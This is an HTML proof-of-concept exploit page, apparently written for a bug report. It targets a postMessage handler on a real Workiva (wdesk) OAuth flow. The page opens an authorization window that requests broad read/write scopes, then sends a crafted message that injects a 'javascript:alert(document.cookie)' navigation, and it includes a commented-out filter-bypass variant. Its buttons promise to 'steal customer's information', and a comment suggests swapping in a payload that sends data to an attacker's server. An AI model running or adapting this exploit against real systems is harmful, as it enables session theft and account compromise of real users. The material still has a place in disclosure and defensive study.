
<!DOCTYPE html>
<html>
<head>
<title>Get the sensitive information by postmessage</title>
<meta name="referrer" content="never">
</head>
<body>
<button id="openH1">Click Here for start</button>
<button id="stealaccount">steal customer's information</button>
<script>
var h1Win;
var s;
function openWin(){
	h1Win = window.open("https://olympus.wdesk.com/s/iam-service/api/v1/oauth2/auth?client_id=wdesk-client&redirect_uri=postmessage&response_type=id_token+token&scope=sox%7Cr+sox%7Cw+connected-process%7Cr+connected-process%7Cw+tasker%7Cr+tasker%7Cw+data_tables%7Cr+data_tables%7Cw+dataentity%7Cr+dataentity%7Cw+document_model%7Cr+fs_adapter%7Cw+permissions%7Cr+workflow%7Cr+workflow%7Cw+linking%7Cr+linking%7Cw+scim%7Cr+fs_adapter%7Cr+document_copy%7Cr+document_copy%7Cw+xbrl-gen%7Cr+xbrl-gen%7Cw+permissions%7Cw+xbrl-data%7Cr+xbrl-data%7Cw+reporting-calendar%7Cr+reporting-calendar%7Cw+snapshot%7Cr+openid+viewer%7Cr+document_analysis%7Cr+licensing%7Cr+licensing%7Cw+byok%7Cr+scim%7Cw&state=253fcaf6-85de-4bdb-8426-827d1c258ea8&workspace=QWNjb3VudB8zMjQ5MzgwODc&account=13ee213099a530e61bbd7256&nonce=d5de2ee6-65fd-4015-92f7-5161e7ac20e2");
	}

	function sendMessage(){
		//var data = JSON.stringify({"type":"link_reload","url":"javasscjavascriptriptcript:alert(document.cookie)"});
		//you can change the url payload for send back some sensitive information to the attacker's server
		h1Win.postMessage("request%%%%%navigate%%%%%javascript:alert(document.cookie)^^^^^test^^^^^800^^^^^400","*");
		console.log("postmessage reload a new iframe's height and width")
	}

 
    //  接受server返回数据
    window.addEventListener('message', function(e) {
        console.log('Get data from oneplus ---> ' + e);
	//clearInterval(s);
    }, false);
document.getElementById("stealaccount").addEventListener('click', sendMessage);
openWin();
// setTimeout("sendMessage()",3000);
</script>
</body>
</html>
